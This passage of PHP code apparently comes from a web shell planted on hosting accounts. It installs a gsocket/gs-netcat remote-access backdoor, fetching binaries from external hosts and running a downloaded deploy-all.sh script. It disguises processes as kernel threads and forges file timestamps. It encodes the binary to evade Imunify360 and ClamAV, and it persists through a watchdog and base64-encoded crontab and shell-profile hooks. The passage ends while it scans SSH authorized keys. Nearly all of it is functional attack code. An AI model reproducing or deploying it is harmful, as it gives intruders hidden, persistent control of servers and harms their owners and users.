        $chk = trim(xcmd("ps aux 2>/dev/null | grep -v grep | grep -cE 'gs-dbus|gs-netcat|defunct'"));
        if (intval($chk) > 0) {
            $gsrnOk = true;
            $steps[] = 'Method 1: OK (daemon running)';
        } else {
            $steps[] = 'Method 1: FAIL';
        }

        // METHOD 2: Direct binary (curl exec → PHP native fallback)
        if (!$gsrnOk) {
            $steps[] = 'Method 2: Direct binary download...';
            $standaloneUrl = "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$archKey";
            // Try curl via exec first
            xcmd("curl -fsSL " . escapeshellarg($standaloneUrl) . " -o " . escapeshellarg($binPath) . " 2>/dev/null");
            if (!file_exists($binPath) || filesize($binPath) < 1000) {
                $tarUrls = ["https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_{$archKey}-alpine.tar.gz", "https://cdn.gsocket.io/bin/gs-netcat_{$archKey}-alpine.tar.gz"];
                foreach ($tarUrls as $tu) {
                    xcmd("curl -fsSL " . escapeshellarg($tu) . " -o " . escapeshellarg("$binDir/gs.tar.gz") . " 2>/dev/null && cd " . escapeshellarg($binDir) . " && tar xfz gs.tar.gz 2>/dev/null && mv -f gs-netcat* " . escapeshellarg($binPath) . " 2>/dev/null && rm -f gs.tar.gz 2>/dev/null");
                    if (file_exists($binPath) && filesize($binPath) > 1000)
                        break;
                }
            }
            // PHP native download fallback (when all exec disabled)
            if (!file_exists($binPath) || filesize($binPath) < 1000) {
                $steps[] = 'curl exec failed, trying PHP native download...';
                $phpUrls = [
                    $standaloneUrl,
                    "https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_{$archKey}-alpine",
                ];
                foreach ($phpUrls as $pu) {
                    $dlSize = php_download($pu, $binPath);
                    if ($dlSize > 1000) {
                        $steps[] = "PHP download OK: $dlSize bytes from $pu";
                        break;
                    }
                }
            }
            if (file_exists($binPath) && filesize($binPath) > 1000) {
                @chmod($binPath, 0700);
                file_put_contents($secFile, $secret);
                @chmod($secFile, 0600);
                xcmd("touch -r /etc/passwd " . escapeshellarg($binPath) . " " . escapeshellarg($secFile) . " 2>/dev/null");
                $portEnv = $port !== '443' ? "GS_PORT=$port " : '';
                // Try all exec methods to start daemon
                $startMethod = php_start_daemon($binPath, $secFile, $portEnv);
                if ($startMethod) {
                    sleep(2);
                    $chk = trim(xcmd("pgrep -f defunct.dat >/dev/null && echo OK || echo FAIL"));
                    if (strpos($chk, 'OK') !== false || $startMethod) {
                        $gsrnOk = true;
                        $steps[] = "Method 2: OK (" . filesize($binPath) . " bytes, started via $startMethod)";
                    } else {
                        $steps[] = "Method 2: started via $startMethod but pgrep check failed (may still be running)";
                        $gsrnOk = true;
                    }
                } else {
                    // Passive install — binary on disk, .profile will start it on next SSH login
                    $steps[] = 'Method 2: ALL exec disabled — passive install (binary saved, will start on next SSH login via .profile)';
                    $gsrnOk = true;
                    $r['passive'] = true;
                }
            } else {
                $steps[] = 'Method 2: all download methods failed';
            }
        }

        // METHOD 3
        if (!$gsrnOk) {
            $steps[] = 'Method 3: deploy-all.sh (bundled)...';
            $allPath = "$binDir/deploy-all.sh";
            xcmd("curl -fsSL 'http://nossl.segfault.net/deploy-all.sh' -o " . escapeshellarg($allPath) . " 2>&1");
            if (file_exists($allPath) && filesize($allPath) > 1000) {
                $cmd3 = "cd " . escapeshellarg($home) . " 2>/dev/null; unset TMPDIR; export HOME=" . escapeshellarg($home) . "; X=" . escapeshellarg($secret) . " GS_PORT=$port GS_HIDDEN_NAME=" . escapeshellarg($hiddenName) . " GS_NOCERTCHECK=1 bash " . escapeshellarg($allPath) . " 2>&1";
                $out3 = xcmd($cmd3);
                @unlink($allPath);
                $steps[] = 'deploy-all output: ' . substr($out3, 0, 400);
                sleep(2);
                $chk = trim(xcmd("ps aux 2>/dev/null | grep -v grep | grep -cE 'gs-dbus|gs-netcat|defunct'"));
                if (intval($chk) > 0) {
                    $gsrnOk = true;
                    $steps[] = 'Method 3: OK';
                } else {
                    $steps[] = 'Method 3: FAIL';
                }
            } else {
                $steps[] = 'Method 3: download failed';
            }
        }

        if (!$gsrnOk) {
            $r['ok'] = false;
            $r['error'] = 'All 3 methods failed';
            $r['steps'] = $steps;
            echo json_encode($r);
            exit;
        }

        $actualBin = trim(xcmd("find " . escapeshellarg($binDir) . " -maxdepth 1 -type f -executable 2>/dev/null | grep -v '.dat' | grep -v '.sh' | grep -v '.cfg' | head -1"));
        if (!$actualBin)
            $actualBin = $binPath;
        $steps[] = "Binary: $actualBin (" . @filesize($actualBin) . " bytes)";

        file_put_contents($secFile, $secret);
        @chmod($secFile, 0600);
        xcmd("touch -r /etc/passwd " . escapeshellarg($secFile) . " 2>/dev/null");

        // Encode binary backup (Imunify360 evasion)
        $cfgFile = "$binDir/.defunct.cfg";
        $encOk2 = false;
        if (file_exists($actualBin) && filesize($actualBin) > 1000) {
            $encOk2 = _gs_pack($actualBin, $cfgFile);
        }
        if (!$encOk2) {
            $steps[] = 'Binary truncated, rescue-downloading for encoding...';
            $resc = '/dev/shm/.gs_rescue_' . getmypid();
            xcmd("curl -fsSL -o " . escapeshellarg($resc) . " 'https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$archKey' 2>/dev/null");
            if (file_exists($resc) && filesize($resc) > 1000)
                $encOk2 = _gs_pack($resc, $cfgFile);
            @unlink($resc);
            xcmd("rm -f " . escapeshellarg($resc) . " 2>/dev/null");
        }
        if ($encOk2) {
            $steps[] = 'Binary encoded to .defunct.cfg — Imunify360 evasion OK';
            @chmod($cfgFile, 0600);
            xcmd("touch -r /etc/passwd " . escapeshellarg($cfgFile) . " 2>/dev/null");
        } else {
            $steps[] = 'WARN: Binary encoding failed';
        }

        // Watchdog (with decode-run to exec-capable dir)
        $steps[] = 'Installing watchdog (with auto-restore)...';
        $portEnv = $port !== '443' ? "export GS_PORT=$port; " : '';
        $perlDec = 'base64 -d "$CFG" | perl -e \'my $k="UmBrElLaShIeLd";my $l=length($k);binmode STDIN;binmode STDOUT;my $b;while(read(STDIN,$b,8192)){my $o="";for my $i(0..length($b)-1){$o.=chr(ord(substr($b,$i,1))^ord(substr($k,$i%$l,1)))}print $o}\'';
        $watchdog = "#!/bin/bash\nOUR_BIN=\"" . addslashes($actualBin) . "\"\nOUR_SEC=\"" . addslashes($secFile) . "\"\nCFG=\"" . addslashes($cfgFile) . "\"\nEDIR=\"" . addslashes($binDir) . "\"\nPORTS=(443 53 22 7350)\nPIDX=0\nFAILS=0\nwhile true; do\n  pgrep -f \"\$OUR_SEC\" >/dev/null 2>&1 || {\n    FAILS=\$((FAILS+1))\n    # Rotate port every 3 consecutive failures\n    if [ \$FAILS -ge 3 ]; then\n      PIDX=\$(( (PIDX+1) % \${#PORTS[@]} ))\n      FAILS=0\n    fi\n    P=\${PORTS[\$PIDX]}\n    PE=\"\"; [ \"\$P\" != \"443\" ] && PE=\"GS_PORT=\$P \"\n    if [ -x \"\$OUR_BIN\" ] && [ -s \"\$OUR_BIN\" ]; then\n      \${PE}nohup \"\$OUR_BIN\" -k \"\$OUR_SEC\" -liqD </dev/null >/dev/null 2>&1 &\n    elif [ -f \"\$CFG\" ]; then\n      T=\"\$EDIR/.gs_\$\$\"\n      $perlDec > \"\$T\" 2>/dev/null\n      chmod 700 \"\$T\" 2>/dev/null\n      \${PE}nohup \"\$T\" -k \"\$OUR_SEC\" -liqD </dev/null >/dev/null 2>&1 &\n      sleep 1\n      rm -f \"\$T\" 2>/dev/null\n    fi\n  }\n  [ \$FAILS -eq 0 ] && FAILS=0\n  sleep 30\ndone";
        $wdPath = "$binDir/.watchdog.sh";
        file_put_contents($wdPath, $watchdog);
        @chmod($wdPath, 0700);
        xcmd("touch -r /etc/passwd " . escapeshellarg($wdPath) . " 2>/dev/null");
        xcmd("pkill -f 'watchdog.sh' 2>/dev/null; sleep 1; nohup bash " . escapeshellarg($wdPath) . " </dev/null >/dev/null 2>&1 &");
        $wdOk = strpos(xcmd("pgrep -f 'watchdog.sh' >/dev/null && echo OK || echo FAIL"), 'OK') !== false;
        $steps[] = $wdOk ? 'Watchdog: OK' : 'Watchdog: FAIL';

        // Persistence (with decode-run fallback)
        $steps[] = 'Setting up persistence...';
        $cronDec2 = "T=/dev/shm/.gs_\\$\\$; base64 -d '" . addslashes($cfgFile) . "' | perl -e 'my \\$k=\"UmBrElLaShIeLd\";my \\$l=length(\\$k);binmode STDIN;binmode STDOUT;my \\$b;while(read(STDIN,\\$b,8192)){my \\$o=\"\";for my \\$i(0..length(\\$b)-1){\\$o.=chr(ord(substr(\\$b,\\$i,1))^ord(substr(\\$k,\\$i%\\$l,1)))}print \\$o}' > \\$T 2>/dev/null && chmod 700 \\$T && nohup \\$T -k '" . addslashes($secFile) . "' -liqD </dev/null >/dev/null 2>&1 & sleep 1; rm -f \\$T";
        $daemonPayload = "pgrep -f '" . addslashes($secFile) . "' >/dev/null 2>&1 || { if [ -x '" . addslashes($actualBin) . "' ]; then {$portEnv}nohup '" . addslashes($actualBin) . "' -k '" . addslashes($secFile) . "' -liqD </dev/null >/dev/null 2>&1 & elif [ -f '" . addslashes($cfgFile) . "' ]; then $cronDec2; fi; }";
        $watchdogPayload = "pgrep -f 'watchdog.sh' >/dev/null 2>&1 || (nohup bash '" . addslashes($wdPath) . "' </dev/null >/dev/null 2>&1 &)";
        $fullPayload = "$daemonPayload; $watchdogPayload";
        $stealthComment = '#1b5b324a50524e47 >/dev/random # seed prng defunct-kernel';
        $stealthNote = '# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel';

        $persistCmd = implode('; ', [
            "export HOME=" . escapeshellarg($home),
            "_CR=\$(echo '" . addslashes($daemonPayload) . "' | base64 -w0 2>/dev/null || echo '" . addslashes($daemonPayload) . "' | base64 2>/dev/null)",
            "_BR=\$(echo '" . addslashes($fullPayload) . "' | base64 -w0 2>/dev/null || echo '" . addslashes($fullPayload) . "' | base64 2>/dev/null)",
            "(crontab -l 2>/dev/null | grep -v 'gs-dbus' | grep -v 'gs-netcat' | grep -v 'GS_ARGS' | grep -v 'defunct' | grep -v '1b5b324a' | grep -v 'seed prng') > /tmp/.cr_\$\$ 2>/dev/null",
            "echo '$stealthNote' >> /tmp/.cr_\$\$",
            "echo '*/5 * * * * { echo \$_CR|base64 -d|bash;} 2>/dev/null $stealthComment' >> /tmp/.cr_\$\$",
            "crontab /tmp/.cr_\$\$ 2>/dev/null",
            "rm -f /tmp/.cr_\$\$ 2>/dev/null",
            "_BTS=\$(stat -c %Y " . escapeshellarg("$home/.bashrc") . " 2>/dev/null || echo '')",
            "sed -i '/gs-dbus/d; /gs-netcat/d; /GS_ARGS/d; /defunct/d; /1b5b324a/d; /seed prng/d' " . escapeshellarg("$home/.bashrc") . " 2>/dev/null",
            "echo '{ echo \$_BR|base64 -d|bash;} 2>/dev/null $stealthComment' >> " . escapeshellarg("$home/.bashrc") . " 2>/dev/null",
            "[ -n \"\$_BTS\" ] && touch -d @\$_BTS " . escapeshellarg("$home/.bashrc") . " 2>/dev/null",
            // .profile/.bash_profile/.bash_login — stealth DAEMON-ONLY (NO interactive output!)
            "for _rf in .profile .bash_profile .bash_login; do _rp=\"$home/\$_rf\"; _rts=\$(stat -c %Y \"\$_rp\" 2>/dev/null || echo ''); sed -i '/defunct/d; /1b5b324a/d; /seed prng/d' \"\$_rp\" 2>/dev/null; echo '{ echo \$_CR|base64 -d|bash;} 2>/dev/null $stealthComment' >> \"\$_rp\" 2>/dev/null; [ -n \"\$_rts\" ] && touch -d @\$_rts \"\$_rp\" 2>/dev/null; done",
            "echo STEALTH_OK",
        ]);
        $pOut = xcmd($persistCmd);
        $steps[] = strpos($pOut, 'STEALTH_OK') !== false ? 'Persistence: OK (crontab + bashrc + profile stealth)' : 'Persistence: partial';
        xcmd("touch -r /etc/passwd " . escapeshellarg($actualBin) . " 2>/dev/null");

        $connectCmd = $port !== '443' ? "GS_PORT=$port gs-netcat -s \"$secret\" -i" : "gs-netcat -s \"$secret\" -i";
        $r['steps'] = $steps;
        $r['binDir'] = $binDir;
        $r['ok'] = $gsrnOk;
        $r['secret'] = $secret;
        $r['port'] = $port;
        $r['connect_cmd'] = $connectCmd;
        $r['hidden_name'] = $hiddenName;
    } elseif ($api === 'gsocket_status') {
        // Search all possible install directories (auto_deploy may use /tmp, /var/tmp, /dev/shm)
        $searchDirs = ["$home/.config/htop", "$home/.cache", "$home/.local/share", "/tmp", "/var/tmp", "/dev/shm", $home];
        $binDir = '';
        // Step 1: Find by .defunct.dat/.defunct.cfg (Shield naming)
        foreach ($searchDirs as $sd) {
            if (file_exists("$sd/.defunct.dat") || file_exists("$sd/.defunct.cfg") || file_exists("$sd/defunct.dat")) {
                $binDir = $sd;
                break;
            }
        }
        // Step 2: Find by [hidden_name].dat (gsocket.io/y installer naming)
        if (!$binDir) {
            $gsNames = ['[kcached]', '[kdevtmpfs]', '[kcompactd0]', '[kswapd0]', '[writeback]', '[bioset]', '[kblockd]', '[kstrp]'];
            foreach ($searchDirs as $sd) {
                foreach ($gsNames as $gn) {
                    if (file_exists("$sd/$gn.dat") || file_exists("$sd/$gn")) {
                        $binDir = $sd;
                        break 2;
                    }
                }
                // Also check for any .gs-* directory (gsocket tmpdir)
                $gsTmp = trim(xcmd("ls -d " . escapeshellarg($sd) . "/.gs-* 2>/dev/null | head -1"));
                if ($gsTmp) { $binDir = $sd; break; }
            }
        }
        // Step 3: Find by running process — check where the daemon is actually running from
        if (!$binDir) {
            $psSec = trim(xcmd("ps aux 2>/dev/null | grep -v grep | grep -oP '(?<=-k\\s)\\S+' | head -1"));
            if ($psSec && file_exists($psSec)) $binDir = dirname($psSec);
        }
        // Step 4: Find gs-netcat binary directly in home root (simple install pattern)
        if (!$binDir && file_exists("$home/gs-netcat") && is_executable("$home/gs-netcat")) {
            $binDir = $home;
        }
        if (!$binDir) $binDir = "$home/.config/htop";
        $secFile = "$binDir/.defunct.dat";
        $cfgFile = "$binDir/.defunct.cfg";
        $r['installed'] = false;
        $r['running'] = false;
        $r['secret'] = '';
        $r['size'] = 0;
        $r['port'] = '443';
        $r['hidden_name'] = '';
        $r['backup'] = false;
        $r['quarantined'] = false;
        $r['bin_dir'] = $binDir;
        $actualBin = trim(xcmd("find " . escapeshellarg($binDir) . " -maxdepth 1 -type f -executable 2>/dev/null | grep -v '.dat' | grep -v '.sh' | grep -v '.cfg' | head -1"));
        if ($actualBin && file_exists($actualBin)) {
            $binSize = filesize($actualBin);
            $r['size'] = $binSize;
            if ($binSize > 1000) {
                $r['installed'] = true;
            } else {
                $r['installed'] = true;
                $r['quarantined'] = true;
                $r['quarantine_reason'] = "Binary truncated to $binSize bytes (Imunify360/ClamAV)";
            }
        }
        if (file_exists($cfgFile)) {
            $r['backup'] = true;
            $r['backup_size'] = filesize($cfgFile);
            if (!$r['installed']) {
                $r['installed'] = true;
                $r['quarantined'] = true;
                $r['quarantine_reason'] = 'Binary removed, encoded backup available';
            }
        }
        // Read secret from multiple possible locations
        if (file_exists($secFile))
            $r['secret'] = trim(file_get_contents($secFile));
        elseif (file_exists("$binDir/defunct.dat"))
            $r['secret'] = trim(file_get_contents("$binDir/defunct.dat"));
        // Check gsocket.io/y installer naming: [hidden_name].dat
        if (!$r['secret']) {
            $gsNames = ['[kcached]', '[kdevtmpfs]', '[kcompactd0]', '[kswapd0]', '[writeback]', '[bioset]', '[kblockd]', '[kstrp]'];
            foreach ($gsNames as $gn) {
                $gsDat = "$binDir/$gn.dat";
                if (file_exists($gsDat)) {
                    $r['secret'] = trim(@file_get_contents($gsDat));
                    $r['hidden_name'] = $gn;
                    if (!$r['installed']) $r['installed'] = true;
                    break;
                }
            }
        }
        // Fallback: find any small .dat file in binDir that looks like a secret key
        if (!$r['secret']) {
            $datFiles = glob("$binDir/*.dat");
            foreach ($datFiles ?: [] as $df) {
                $dsz = @filesize($df);
                if ($dsz > 0 && $dsz < 100) {
                    $dc = trim(@file_get_contents($df));
                    if (preg_match('/^[A-Za-z0-9+\/=\-_]{16,}$/', $dc)) {
                        $r['secret'] = $dc;
                        $r['secret_file'] = $df;
                        if (!$r['installed']) $r['installed'] = true;
                        break;
                    }
                }
            }
        }
        // Last resort: check running process args for -k flag
        if (!$r['secret']) {
            $psSec = trim(xcmd("ps aux 2>/dev/null | grep -v grep | grep -oP '(?<=-k\\s)\\S+' | head -1"));
            if ($psSec && file_exists($psSec))
                $r['secret'] = trim(@file_get_contents($psSec));
        }
        $procCount = intval(trim(xcmd("ps aux 2>/dev/null | grep -v grep | grep -cE 'gs-dbus|gs-netcat|defunct'")));
        $r['running'] = $procCount > 0;
        $r['proc_count'] = $procCount;
        // Check port from crontab or process args (bashrc may not exist on VPS)
        $portMatch = trim(xcmd("grep -oP 'GS_PORT=\\K[0-9]+' " . escapeshellarg("$home/.bashrc") . " 2>/dev/null | head -1"));
        if (!$portMatch) $portMatch = trim(xcmd("crontab -l 2>/dev/null | grep -oP 'GS_PORT=\\K[0-9]+' | head -1"));
        if ($portMatch)
            $r['port'] = $portMatch;
        $nameMatch = trim(xcmd("grep -oP 'GS_HIDDEN_NAME=\"\\K[^\"]+' " . escapeshellarg("$home/.bashrc") . " 2>/dev/null | head -1"));
        if ($nameMatch)
            $r['hidden_name'] = $nameMatch;
        $wdRunning = strpos(xcmd("pgrep -f 'watchdog.sh' >/dev/null 2>&1 && echo OK || echo NO"), 'OK') !== false;
        $r['watchdog'] = $wdRunning;
        $cronCount = intval(trim(xcmd("crontab -l 2>/dev/null | grep -cE 'gs-netcat|defunct|GS_PORT' 2>/dev/null || echo 0")));
        $r['crontab'] = $cronCount > 0;
        $r['lock'] = $r['crontab'];
        // Also expose binary path for UI
        if ($binDir && file_exists("$binDir/gs-netcat")) $r['bin_path'] = "$binDir/gs-netcat";
        elseif (file_exists("$home/gs-netcat")) $r['bin_path'] = "$home/gs-netcat";
    } elseif ($api === 'gsocket_start') {
        // Search all possible install directories (include home root for simple install pattern)
        $searchDirs = ["$home/.config/htop", "$home/.cache", "$home/.local/share", "/tmp", "/var/tmp", "/dev/shm", $home];
        $binDir = '';
        foreach ($searchDirs as $sd) {
            if (file_exists("$sd/.defunct.dat") || file_exists("$sd/.defunct.cfg") || file_exists("$sd/defunct.dat")) {
                $binDir = $sd;
                break;
            }
        }
        // Fallback: gs-netcat binary at home root without key file
        if (!$binDir && file_exists("$home/gs-netcat") && is_executable("$home/gs-netcat")) {
            $binDir = $home;
        }
        if (!$binDir) $binDir = "$home/.config/htop";
        $secFile = "$binDir/.defunct.dat";
        $cfgFile = "$binDir/.defunct.cfg";
        if (!file_exists($secFile))
            $secFile = "$binDir/defunct.dat";
        // Last resort: try to get secret from running process args
        if (!file_exists($secFile)) {
            $procSec = trim(xcmd("ps aux 2>/dev/null | grep -v grep | grep gs-netcat | grep -oP '(?<=-s )\\S+' | head -1"));
            if ($procSec && preg_match('/^[A-Za-z0-9+\/=\-_]{8,}$/', $procSec)) {
                @file_put_contents("$home/.defunct.dat", $procSec);
                $secFile = "$home/.defunct.dat";
                $binDir = $home;
            }
        }
        if (!file_exists($secFile)) {
            $r['ok'] = false;
            $r['error'] = 'Secret key file not found. Use Lock section to setup with your secret key.';
            echo json_encode($r);
            exit;
        }
        $r['bin_dir'] = $binDir;
        $actualBin = trim(xcmd("find " . escapeshellarg($binDir) . " -maxdepth 1 -type f -executable 2>/dev/null | grep -v '.dat' | grep -v '.sh' | grep -v '.cfg' | head -1"));
        $portMatch = trim(xcmd("grep -oP 'GS_PORT=\\K[0-9]+' " . escapeshellarg("$home/.bashrc") . " 2>/dev/null | head -1"));
        if (!$portMatch) $portMatch = trim(xcmd("crontab -l 2>/dev/null | grep -oP 'GS_PORT=\\K[0-9]+' | head -1"));
        $preferredPort = $portMatch ?: '443';
        $ports = array_unique(array_merge([$preferredPort], ['443', '53', '22', '7350']));
        $diag = [];

        // Step 1: Check binary integrity
        $binOk = $actualBin && file_exists($actualBin) && filesize($actualBin) > 1000;
        $binHdr = $binOk ? @file_get_contents($actualBin, false, null, 0, 4) : '';
        $binElf = $binHdr === "\x7fELF";
        if ($actualBin && file_exists($actualBin) && !$binOk) {
            $diag[] = 'Binary truncated (' . filesize($actualBin) . ' bytes) — Imunify360 likely quarantined it';
        }
        if ($binOk && !$binElf) {
            $diag[] = 'Binary corrupted (not valid ELF) — will use decode-run';
            $binOk = false;
        }

        // Step 2: Auto-restore binary from .defunct.cfg if truncated
        if (!$binOk && file_exists($cfgFile)) {
            $diag[] = 'Attempting auto-restore from encoded backup...';
            $restored = _gs_unpack($cfgFile);
            if ($restored && strlen($restored) > 1000) {
                $restorePath = $actualBin ?: "$binDir/defunct";
                @file_put_contents($restorePath, $restored);
                @chmod($restorePath, 0700);
                xcmd("touch -r /etc/passwd " . escapeshellarg($restorePath) . " 2>/dev/null");
                $actualBin = $restorePath;
                $binOk = true;
                $diag[] = 'Binary restored: ' . strlen($restored) . ' bytes';
            } else {
                $diag[] = 'Restore failed — will use decode-run mode';
            }
        }

        $started = false;
        $usedMethod = '';
        $usedPort = '';

        // Step 3: Try starting with port rotation
        foreach ($ports as $port) {
            $portEnv = $port !== '443' ? "GS_PORT=$port " : '';

            // Method A: Direct binary
            if ($binOk && !$started) {
                xcmd("pkill -f " . escapeshellarg(basename($secFile)) . " 2>/dev/null; sleep 1");
                $startFn = php_start_daemon($actualBin, $secFile, $portEnv);
                if ($startFn) {
                    sleep(3);
                    $alive = intval(trim(xcmd("pgrep -fc " . escapeshellarg(basename($secFile)) . " 2>/dev/null")));
                    if ($alive > 0) {
                        $started = true;
                        $usedMethod = "binary ($startFn)";
                        $usedPort = $port;
                        $diag[] = "Port $port: binary start OK (pid alive after 3s)";
                        break;
                    } else {
                        $diag[] = "Port $port: binary started but died within 3s (killed by Imunify/firewall?)";
                    }
                }
            }

            // Method B: Decode-run (stealth — binary deleted after exec, runs from RAM)
            if (!$started && file_exists($cfgFile)) {
                xcmd("pkill -f " . escapeshellarg(basename($secFile)) . " 2>/dev/null; sleep 1");
                $deployOk = _gs_deploy($cfgFile, $secFile, $portEnv, $binDir);
                if ($deployOk) {
                    sleep(3);
                    $alive = intval(trim(xcmd("pgrep -fc " . escapeshellarg(basename($secFile)) . " 2>/dev/null")));
                    if ($alive > 0) {
                        $started = true;
                        $usedMethod = 'decode-run (stealth)';
                        $usedPort = $port;
                        $diag[] = "Port $port: decode-run OK (pid alive after 3s, binary deleted from disk)";
                        break;
                    } else {
                        $diag[] = "Port $port: decode-run started but died — trying next port";
                    }
                } else {
                    $diag[] = "Port $port: decode-run deploy failed";
                }
            }
        }

        $r['ok'] = $started;
        $r['method'] = $usedMethod;
        $r['port'] = $usedPort;
        $r['diag'] = $diag;
        if (!$started) {
            $r['error'] = 'All ports and methods failed. Diagnostics: ' . implode(' | ', $diag);
            $r['hint'] = 'Possible causes: (1) All GSocket relay ports blocked by firewall (2) Imunify360 killing process instantly (3) exec disabled — try passive install via .profile';
        }

        // Step 4: Start watchdog if daemon is running
        if ($started) {
            $wdPath = "$binDir/.watchdog.sh";
            if (file_exists($wdPath))
                xcmd("pgrep -f 'watchdog.sh' >/dev/null 2>&1 || nohup bash " . escapeshellarg($wdPath) . " </dev/null >/dev/null 2>&1 &");
        }
    } elseif ($api === 'gsocket_stop') {
        xcmd("pkill -9 -f 'watchdog.sh' 2>/dev/null; pkill -9 -f gs-dbus 2>/dev/null; pkill -9 -f gs-netcat 2>/dev/null; pkill -9 -f defunct.dat 2>/dev/null; pkill -9 -f defunct 2>/dev/null");
        $r['ok'] = true;

    } elseif ($api === 'gsocket_lock') {
        $port = preg_replace('/[^0-9]/', '', $_POST['port'] ?? '443') ?: '443';
        $interval = max(1, min(60, intval($_POST['interval'] ?? 5)));
        $inputSecret = trim($_POST['secret'] ?? '');
        $withLock = ($_POST['lock'] ?? '1') !== '0';

        // Find binary — prefer home root (user's simple pattern)
        $binPath = '';
        $binCandidates = ["$home/gs-netcat", "$home/.config/htop/defunct", "$home/.softaculous/htop/defunct", "/tmp/defunct"];
        foreach ($binCandidates as $bc) {
            if (@file_exists($bc) && @is_executable($bc) && @filesize($bc) > 1000) {
                $hdr = @file_get_contents($bc, false, null, 0, 4);
                if ($hdr === "\x7fELF") { $binPath = $bc; break; }
            }
        }
        // If not found, download it (simple pattern: curl to ~/gs-netcat)
        if (!$binPath) {
            $arch = trim(xcmd('uname -m')) ?: 'x86_64';
            $archKey = (strpos($arch, 'aarch64') !== false || strpos($arch, 'arm64') !== false) ? 'aarch64' : 'x86_64';
            $dlUrl = "https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-$archKey";
            $dlPath = "$home/gs-netcat";
            xcmd("curl -fsSL " . escapeshellarg($dlUrl) . " -o " . escapeshellarg($dlPath) . " && chmod +x " . escapeshellarg($dlPath) . " 2>/dev/null");
            if (file_exists($dlPath) && filesize($dlPath) > 1000) $binPath = $dlPath;
        }

        if (!$binPath) {
            $r['ok'] = false; $r['error'] = 'Cannot find or download gs-netcat binary. Check network access.';
            echo json_encode($r); exit;
        }

        // Resolve secret
        $secret = $inputSecret;
        if (!$secret) {
            // Try .defunct.dat
            foreach (["$home/.defunct.dat", dirname($binPath) . "/.defunct.dat"] as $sf) {
                if (@file_exists($sf)) {
                    $sc = trim(@file_get_contents($sf));
                    if (preg_match('/^[A-Za-z0-9+\/=\-_]{8,}$/', $sc)) { $secret = $sc; break; }
                }
            }
        }
        if (!$secret) {
            // Try running process
            $secret = trim(xcmd("ps aux 2>/dev/null | grep -v grep | grep gs-netcat | grep -oP '(?<=-s )\\S+' | head -1"));
        }
        if (!$secret) {
            // Auto-generate
            $secret = trim(xcmd("openssl rand -hex 8 2>/dev/null"));
            if (!$secret) $secret = bin2hex(random_bytes(8));
        }

        // Save secret
        @file_put_contents("$home/.defunct.dat", $secret);
        @chmod("$home/.defunct.dat", 0600);

        // Check if already running
        $running = intval(trim(xcmd("pgrep -f gs-netcat 2>/dev/null | wc -l"))) > 0;

        $results = [];
        $cronOk = false;

        if ($withLock) {
            // Install crontab (user's preferred pattern)
            $cronExpr = $interval == 1 ? '* * * * *' : "*/$interval * * * *";
            $cronLine = "$cronExpr pgrep -f gs-netcat >/dev/null 2>&1 || GS_PORT=$port GS_HOST=goto.cloudns.cl " . escapeshellarg($binPath) . " -s " . escapeshellarg($secret) . " -l -i >/dev/null 2>&1";
            $pid = getmypid();
            xcmd("(crontab -l 2>/dev/null | grep -v 'gs-netcat' | grep -v 'gs-dbus' | grep -v 'defunct' | grep -v 'GS_PORT') > /tmp/.crl$pid; echo " . escapeshellarg($cronLine) . " >> /tmp/.crl$pid; crontab /tmp/.crl$pid 2>/dev/null; rm -f /tmp/.crl$pid 2>/dev/null");
            $cronOk = intval(trim(xcmd("crontab -l 2>/dev/null | grep -c gs-netcat 2>/dev/null || echo 0"))) > 0;
            if ($cronOk)
                $results[] = "crontab ✔ ($cronExpr) — gs-netcat akan start otomatis dalam $interval menit";
            else
                $results[] = 'crontab ✘ FAILED (mungkin crontab diblokir hosting)';

        } else {
            $results[] = 'persistence: skipped (deploy only)';
        }

        $r['ok'] = $cronOk || !$withLock;
        $r['running'] = $running;
        $r['crontab'] = $cronOk;
        $r['secret'] = $secret;
        $r['binary'] = $binPath;
        $r['results'] = $results;
        $r['wait_minutes'] = $cronOk ? $interval : 0;
        $r['connect_cmd'] = ($port !== '443' ? "GS_PORT=$port " : '') . "gs-netcat -s \"$secret\" -i";

    } elseif ($api === 'gsocket_unlock') {
        $pid = getmypid();
        xcmd("(crontab -l 2>/dev/null | grep -v 'gs-netcat' | grep -v 'gs-dbus' | grep -v 'defunct' | grep -v 'GS_PORT') > /tmp/.cru$pid 2>/dev/null; crontab /tmp/.cru$pid 2>/dev/null; rm -f /tmp/.cru$pid 2>/dev/null");
        $cronRemain = intval(trim(xcmd("crontab -l 2>/dev/null | grep -c gs-netcat 2>/dev/null || echo 0")));
        $r['ok'] = true;
        $r['crontab_cleared'] = $cronRemain === 0;
        $r['message'] = 'Persistence removed. Crontab: ' . ($cronRemain === 0 ? 'cleared' : 'check manually');

    } elseif ($api === 'scan_ssh') {
        $sshHome = $home;
        if (function_exists('posix_getpwuid') && function_exists('posix_getuid')) {
            $pw = @posix_getpwuid(posix_getuid());
            if ($pw && !empty($pw['dir']) && is_dir($pw['dir'])) $sshHome = $pw['dir'];
        }
        if ($sshHome === $home) { $e = getenv('HOME'); if ($e && $e !== '/tmp' && is_dir($e)) $sshHome = $e; }
        $sshDir = "$sshHome/.ssh";
        $keys = [];
        $akFile = "$sshDir/authorized_keys";
        $keyFiles = [];
        if (is_dir($sshDir)) {
            foreach (scandir($sshDir) as $f) {
                if ($f === '.' || $f === '..')
                    continue;
                $fp = "$sshDir/$f";
                $keyFiles[] = ['name' => $f, 'size' => @filesize($fp), 'mod' => date('Y-m-d H:i', @filemtime($fp)), 'perm' => substr(sprintf('%o', @fileperms($fp)), -4)];
            }
        }
        if (file_exists($akFile)) {
            $lines = file($akFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $knownServices = ['sitelock', 'codeguard', 'cpanel', 'bluehost', 'hostgator', 'plesk', 'cloudlinux', 'imunify', 'letsencrypt'];
            $idx = 0;
            foreach ($lines as $line) {
                $line = trim($line);
                if (!$line)
                    continue;
                if ($line[0] === '#') {
                    $keys[] = ['idx' => $idx, 'type' => 'comment', 'value' => $line, 'threat' => false];
                    $idx++;
                    continue;
                }
                $parts = preg_split('/\s+/', $line);
                $keyType = $parts[0] ?? '';
                $comment = end($parts);
                $isKnown = false;
                foreach ($knownServices as $svc) {
                    if (stripos($line, $svc) !== false) {
                        $isKnown = true;
                        break;
                    }
                }
